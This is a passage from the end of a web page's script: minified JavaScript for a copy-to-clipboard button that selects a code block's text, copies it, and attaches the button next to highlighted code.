const range=document.createRange();range.selectNodeContents(codeblock);const selection=window.getSelection();selection.removeAllRanges();selection.addRange(range);try{document.execCommand('copy');copyingDone();}catch(e){};selection.removeRange(range);});if(container.classList.contains("highlight")){container.appendChild(copybutton);}else if(container.parentNode.firstChild==container){}else if(codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"){codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);}else{codeblock.parentNode.appendChild(copybutton);}});</script></body></html>